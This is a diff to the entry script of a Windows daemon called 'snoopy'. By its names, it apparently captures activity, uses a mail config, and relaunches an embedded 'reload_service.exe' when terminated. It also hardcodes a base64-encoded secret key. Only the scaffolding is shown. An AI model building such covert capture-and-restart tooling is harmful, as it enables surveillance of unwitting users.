@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 import os
-import traceback
+from lib.file_finder import get_embedded_filename
 from lib.daemon import Daemon
 from win32.killer import GracefulKiller
 from win32 import capture as catcher
@@ -16,6 +16,7 @@ installation_path = '{}\\dist\\snoopy'.format(directory)
 # secret_key        = 'SUPER_SECRET_KEY'
 secret_key        = 'U1VQRVJfU0VDUkVUX0tFWQ=='
 mail_config       = 'windows_mail.config'
+reloader_name     = 'reload_service.exe'
 
 
 class MyDaemon(Daemon):
@@ -29,26 +30,11 @@ class MyDaemon(Daemon):
             catcher)
 
     def setup(self):
-        # the graceful killer registers events on init
-        GracefulKiller(self.notifier)
-        # config_event_handler = ConfigFileEventHandler(
-        #     self.notifier,
-        #     config_dir,
-        #     launchd_path,
-        #     get_plist_filename())
-        # self.observer.schedule(
-        #     config_event_handler,
-        #     launchd_path,
-        #     recursive=False)
         pass
 
 
-ASADMIN = 'asadmin'
 if __name__ == "__main__":
-    try:
-        daemon = MyDaemon()
-        daemon.run()
-    except Exception as e:
-        print(str(e))
-        traceback.print_exc()
-        print("shutting down...")
+    killer = GracefulKiller(
+        MyDaemon(),
+        get_embedded_filename(reloader_name))
+    killer.run()
